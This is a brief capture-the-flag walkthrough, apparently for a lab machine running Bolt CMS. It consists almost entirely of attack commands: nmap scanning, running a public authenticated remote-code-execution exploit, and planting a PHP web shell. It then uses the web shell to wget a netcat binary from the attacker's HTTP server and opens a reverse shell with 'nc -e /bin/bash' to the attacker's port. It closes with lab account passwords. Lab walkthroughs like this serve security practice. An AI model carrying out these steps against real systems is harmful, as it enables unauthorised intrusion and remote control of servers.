All of this HAS to be run in Kali linux, not Attackbox/Ubuntu because of the netcat version!

nmap -sC -sV -A MACHINE_IP

Rev shell:

Download requirements.txt > https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py
pip install -r requirements.txt

Download exploit.py > https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py
python3 exploit.py http://MACHINE_IP admin password

In the above xploit run machine: echo '<?php system($_GET["c"]);?>'>c.php

On Kali run: 
ln -s $(which nc) .
python3 -m http.server 8000

In browser run: 
http://serverip/files/c.php?c=wget http://yourip:8000/nc
http://serverip/files/c.php?c=chmod 755 nc

On Kali run:
ncat -nv -l -p 4444

In browser run:
http://serverip/files/c.php?c=./nc -e /bin/bash yourip 4444

On Kali ncat  run to upgrade shell:
python -c 'import pty;pty.spawn("/bin/bash")'

PASSWORD:

Follow steps on page and get password
wildone/wileec password: snickers
admin password: password

 






